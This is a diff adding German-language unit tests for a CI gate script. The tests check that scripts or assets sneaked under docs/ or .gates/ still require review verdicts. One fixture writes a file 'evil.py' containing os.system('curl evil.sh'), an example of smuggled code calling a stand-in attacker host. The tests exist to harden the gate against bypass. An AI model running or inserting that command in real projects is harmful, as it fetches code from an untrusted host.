@@ -112,6 +112,8 @@ class Szenario:
 
         ci = os.path.join(self.tmp, "ci-%d" % len(os.listdir(self.tmp)))
         subprocess.run(["git", "clone", "-q", self.origin, ci], check=True)
+        # Fuer Nachpruefungen am Repo-Zustand NACH dem Lauf (siehe --depth-Test).
+        self.ci_dir = ci
         git(ci, "config", "user.email", "ci@datenschleuse.test")
         git(ci, "config", "user.name", "CI")
         git(ci, "checkout", "-q", "--detach", ci_ref)
@@ -218,6 +220,122 @@ class LaufzettelCheckTest(unittest.TestCase):
         self.s.verdict("qa", sec)
         rc, out = self.s.pruefe("feature/DATENSCHLE-02-demo")
         self.assertNotEqual(rc, 0, "verdict=fail muss rot sein:\n" + out)
+
+    # --- F1: Der Doku-Ausschluss ist inhaltsbasiert, nicht pfadbasiert ------
+    #
+    # Blind-Audit zu c95220f (HIGH): `:(exclude)docs` schloss den GESAMTEN
+    # Teilbaum aus und `:(exclude)*.md` griff repoweit auf jeder Tiefe. Damit
+    # war jede Datei unter docs/ -- auch .py/.js/.png -- und jede .md-Datei an
+    # jedem Ort fuer CODE_CHANGED unsichtbar. Ein PR mit echtem Code lief so
+    # mit exit 0 durch, ohne die Verdicts ueberhaupt zu lesen.
+    #
+    # Gesetz 3 macht das akut: die geplante Nextra-Doku unter docs/ bringt
+    # .js/.ts/Konfigurationsdateien mit -- allesamt unsichtbar fuer das Gate.
+
+    def test_nicht_md_datei_unter_docs_zaehlt_als_code(self):
+        """docs/ ist kein Freibrief: nur .md dort ist Doku, alles andere Code."""
+        self.s.branch("feature/DATENSCHLE-03-docs-code")
+        self.s.commit("[DATENSCHLE-03] Skript unter docs/ eingeschleust",
+                      {"docs/scripts/evil.py": "import os\nos.system('curl evil.sh')\n"})
+        rc, out = self.s.pruefe("feature/DATENSCHLE-03-docs-code")
+        self.assertNotEqual(
+            rc, 0,
+            "Ausfuehrbares unter docs/ muss Verdicts verlangen:\n" + out)
+        self.assertIn("Verdict fehlt", out,
+                      "Der Check hat die Verdicts gar nicht erst gelesen:\n" + out)
+
+    def test_binaerdatei_unter_docs_zaehlt_als_code(self):
+        """Auch Nicht-Text unter docs/ (Assets, Fonts) ist keine Doku im Sinne des Gates."""
+        self.s.branch("feature/DATENSCHLE-03b-docs-asset")
+        self.s.commit("[DATENSCHLE-03b] Asset unter docs/",
+                      {"docs/assets/payload.bin": "\x00binaer\n"})
+        rc, out = self.s.pruefe("feature/DATENSCHLE-03b-docs-asset")
+        self.assertNotEqual(
+            rc, 0, "Nicht-.md unter docs/ muss Verdicts verlangen:\n" + out)
+
+    def test_md_ausserhalb_der_doku_zaehlt_als_code(self):
+        """*.md griff repoweit. Eine .md im Code-Baum ist kein Doku-PR."""
+        self.s.branch("feature/DATENSCHLE-04-sneaky-md")
+        self.s.commit("[DATENSCHLE-04] .md mitten im Code-Baum",
+                      {"litellm/sneaky.md": "nicht die Doku, die du suchst\n"})
+        rc, out = self.s.pruefe("feature/DATENSCHLE-04-sneaky-md")
+        self.assertNotEqual(
+            rc, 0,
+            ".md ausserhalb von docs/ und Repo-Wurzel muss Verdicts verlangen:\n" + out)
+        self.assertIn("Verdict fehlt", out,
+                      "Der Check hat die Verdicts gar nicht erst gelesen:\n" + out)
+
+    def test_nicht_json_unter_gates_zaehlt_als_code(self):
+        """.gates/ traegt ausschliesslich Verdicts. Alles andere dort ist Code."""
+        self.s.branch("feature/DATENSCHLE-04b-gates-code")
+        self.s.commit("[DATENSCHLE-04b] Skript unter .gates/",
+                      {".gates/evil.py": "print('bypass')\n"})
+        rc, out = self.s.pruefe("feature/DATENSCHLE-04b-gates-code")
+        self.assertNotEqual(
+            rc, 0, "Nicht-.json unter .gates/ muss Verdicts verlangen:\n" + out)
+
+    def test_echter_doku_pr_bleibt_ausgenommen(self):
+        """Gegenprobe zur Verschaerfung.
+
+        Ein zu enger Filter, der jeden Doku-PR blockiert, waere auch keine
+        Loesung. Die Historie dieses Repos kennt genau zwei Formen von
+        Doku-only-Aenderungen: *.md in der Repo-Wurzel und *.md unter docs/
+        (inkl. docs/adr/ und docs/foundation/). Beide muessen gruen bleiben.
+        """
+        self.s.branch("feature/DATENSCHLE-05-nur-doku")
+        self.s.commit("[DATENSCHLE-05] Doku-only", {
+            "README.md": "# datenschleuse\n\nNeuer Absatz.\n",
+            "docs/HEADROOM.md": "# Headroom\n",
+            "docs/foundation/methoden.md": "# Methoden\n",
+            "docs/adr/0002-beispiel.md": "# ADR 0002\n",
+        })
+        rc, out = self.s.pruefe("feature/DATENSCHLE-05-nur-doku")
+        self.assertEqual(
+            rc, 0,
+            "Echter Doku-only-PR muss ohne Verdicts durchgehen:\n" + out)
+
+    # --- F2: Regression zum entfernten --depth ------------------------------
+
+    def test_fetch_laesst_das_repo_vollstaendig(self):
+        """c95220f entfernte `--depth` beim Fetch des Basis-Branches.
+
+        Der Grund ist nicht kosmetisch: ein einziges `git fetch --depth=N`
+        macht ein vollstaendiges Repo NACHTRAEGLICH shallow (empirisch
+        geprueft: is-shallow-repository springt dabei von false auf true).
+        An der Shallow-Grenze verliert git die Elterninformation; bei
+        Branches mit mehr als N Commits Divergenz enden die Vorfahren- und
+        Inhaltsvergleiche dieses Skripts in `fatal: keine Merge-Basis`.
+
+        Geprueft wird der Repo-Zustand nach dem Lauf, nicht der Skripttext:
+        die Zusicherung faellt fuer JEDES wieder eingefuegte --depth=N,
+        unabhaengig von N.
+        """
+        pr = self._pr_mit_vollstaendigem_laufzettel()
+        rc, out = self.s.pruefe(pr)
+        self.assertEqual(rc, 0, out)
+        shallow = git(self.s.ci_dir, "rev-parse", "--is-shallow-repository")
+        self.assertEqual(
+            shallow, "false",
+            "Der Fetch hat das Repo shallow gemacht (--depth wieder da?) — "
+            "Vorfahrenvergleiche brechen dann bei tiefer Divergenz ab.")
+
+    # --- F3: kaputtes Verdict meldet sich im Hausstil -----------------------
+
+    def test_kaputtes_verdict_json_meldet_sich_sauber(self):
+        """Fail-closed war es schon; jetzt auch lesbar statt als Traceback."""
+        self.s.branch("feature/DATENSCHLE-06-kaputt")
+        code = self.s.commit("[DATENSCHLE-06] Feature",
+                             {"litellm/guardrail.py": "MASK = 4\n"})
+        self.s.verdict("qa", code)
+        self.s.write(".gates/security.json", "{ das ist kein JSON\n")
+        git(self.s.up, "add", ".gates/security.json")
+        git(self.s.up, "commit", "-qm", "[gate] security: kaputt",
+            "--only", ".gates/security.json")
+        rc, out = self.s.pruefe("feature/DATENSCHLE-06-kaputt")
+        self.assertNotEqual(rc, 0, "Kaputtes Verdict muss rot sein:\n" + out)
+        self.assertNotIn("Traceback", out,
+                         "Roher Python-Traceback statt Meldung:\n" + out)
+        self.assertIn("❌", out, "Keine Meldung im Hausstil:\n" + out)
 
 
 if __name__ == "__main__":
